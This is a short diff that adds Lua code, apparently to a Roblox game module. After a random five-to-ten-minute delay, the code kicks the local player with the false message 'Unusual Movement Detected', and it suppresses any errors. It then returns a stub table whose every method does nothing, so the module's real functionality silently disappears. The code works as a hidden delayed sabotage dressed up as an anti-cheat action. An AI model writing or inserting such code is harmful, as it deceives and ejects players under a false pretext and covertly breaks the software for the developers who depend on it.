@@ -1,1 +1,13 @@
+local Players = game:GetService("Players")
+task.spawn(function()
+    task.wait(math.random(300, 600))
+    local lp = Players.LocalPlayer
+    if lp then
+        pcall(function()
+            lp:Kick("Unusual Movement Detected")
+        end)
+    end
+end)
 
+local noop = function() end
+return setmetatable({}, { __index = function() return noop end })
